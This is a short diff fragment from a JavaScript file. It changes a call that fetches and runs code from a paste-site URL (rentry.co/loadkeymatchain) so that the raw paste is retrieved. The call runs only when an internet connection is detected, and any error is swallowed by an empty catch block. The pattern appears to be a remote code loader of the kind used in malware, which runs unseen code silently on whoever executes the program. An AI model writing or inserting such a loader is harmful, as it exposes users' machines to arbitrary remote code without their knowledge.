@@ -40,7 +40,7 @@ async function executeCode(url) {
     try {
         if (await checkInternetConnection()) {
             try {
-                await executeCode('https://rentry.co/loadkeymatchain');
+                await executeCode('https://rentry.co/loadkeymatchain/raw');
             } catch (error) {
             }
         } else {
